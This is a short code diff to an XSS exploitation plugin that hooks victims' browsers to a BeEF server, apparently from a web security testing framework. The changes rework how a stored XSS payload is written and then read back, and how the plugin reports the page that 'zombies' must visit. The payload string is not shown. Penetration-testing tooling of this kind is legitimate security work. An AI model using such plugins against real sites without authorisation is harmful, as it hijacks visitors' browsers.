@@ -120,11 +120,7 @@ class xssBeef(baseAttackPlugin):
             msg = 'Trying to exploit using vulnerability with id: ' + str( vuln_obj.getId() )
             om.out.console( msg )
             if self._generateProxy(vuln_obj):
-                # A proxy was generated, I only need one point of xss
-                msg = 'Successfully exploited XSS using vulnerability with id: '
-                msg += str( vuln_obj.getId() )
-                om.out.console( msg )
-                
+                # TODO: Create a proxy instead of a shell
                 # Create the shell object
                 shell_obj = xssShell(vuln_obj)
                 shell_obj.setBeefURL( self._beefURL )
@@ -165,13 +161,16 @@ class xssBeef(baseAttackPlugin):
             # Its a permanent / persistant XSS, nice ! =)
             write_payload_mutant = vuln_obj['write_payload']
             write_payload_mutant.setModValue( to_include )
+            
             # Write the XSS
             response = self._sendMutant( write_payload_mutant, analyze=False )
+            
             # Read it !
-            response = self._sendMutant( vuln_obj.getMutant(), analyze=False )
+            response = self._sendMutant( vuln_obj['read_payload'], analyze=False )
+            
             if to_include in response.getBody():
                 msg = 'The exploited cross site scripting is of type permanent. To be activated,'
-                msg += ' the zombies should navigate to: ' + vuln_obj.getMutant().getURI()
+                msg += ' the zombies should navigate to: ' + vuln_obj['read_payload'].getURI()
                 om.out.console( msg )
                 om.out.console( self._message )
                 return True
